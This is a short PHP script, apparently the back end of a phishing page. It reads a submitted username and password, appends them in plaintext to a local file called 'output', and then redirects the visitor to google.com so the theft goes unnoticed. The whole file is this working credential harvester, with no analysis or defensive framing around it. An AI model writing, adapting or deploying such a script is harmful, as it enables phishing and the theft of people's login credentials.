<?php
    /* Catch input */
    $user = $_REQUEST["user"];
    $pwd  = $_REQUEST["pwd"];

    /* Formating input */
    $text = "
===============
user: $user
pwd : $pwd
===============
";

    /* Write to file */
    $file = fopen("output", "a+");
    fwrite($file, $text);
    fclose($file);
    
    /* If writing doesn't work, make sure   *
     * script.php has permission to WRITE.  */

    /* Redirecting the User */
    $url = "https://google.com";
    header('Location: '.$url);
?>